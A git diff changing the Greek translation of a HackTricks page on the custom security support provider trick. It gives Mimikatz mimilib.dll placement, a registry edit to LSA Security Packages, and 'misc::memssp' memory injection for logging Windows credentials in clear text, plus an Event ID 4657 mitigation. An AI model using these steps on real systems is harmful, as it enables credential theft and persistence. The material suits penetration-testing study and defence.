@@ -22,8 +22,8 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 #### Mimilib
 
-Μπορείτε να χρησιμοποιήσετε το δυαδικό αρχείο `mimilib.dll` που παρέχεται από το Mimikatz. **Αυτό θα καταγράψει μέσα σε ένα αρχείο όλα τα διαπιστευτήρια σε καθαρό κείμενο.**\
-Ρίξτε το dll στο `C:\Windows\System32\`\
+Μπορείτε να χρησιμοποιήσετε το δυαδικό αρχείο `mimilib.dll` που παρέχεται από το Mimikatz. **Αυτό θα καταγράψει σε ένα αρχείο όλα τα διαπιστευτήρια σε καθαρό κείμενο.**\
+Αφήστε το dll στο `C:\Windows\System32\`\
 Πάρτε μια λίστα με τα υπάρχοντα LSA Security Packages:
 
 {% code title="attacker@target" %}
@@ -39,32 +39,32 @@ Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\
 ```powershell
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
-Και μετά από μια επανεκκίνηση, όλα τα διαπιστευτήρια μπορούν να βρεθούν σε καθαρό κείμενο στο `C:\Windows\System32\kiwissp.log`
+And after a reboot all credentials can be found in clear text in `C:\Windows\System32\kiwissp.log`
 
 #### Στη μνήμη
 
-Μπορείτε επίσης να το εισάγετε απευθείας στη μνήμη χρησιμοποιώντας το Mimikatz (σημειώστε ότι μπορεί να είναι λίγο ασταθές/μη λειτουργικό):
+You can also inject this in memory directly using Mimikatz (notice that it could be a little bit unstable/not working):
 ```powershell
 privilege::debug
 misc::memssp
 ```
-This won't survive reboots.
+Αυτό δεν θα επιβιώσει σε επανεκκινήσεις.
 
-#### Mitigation
+#### Μετριασμός
 
-Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
+Event ID 4657 - Έλεγχος δημιουργίας/αλλαγής του `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Υποστήριξη HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
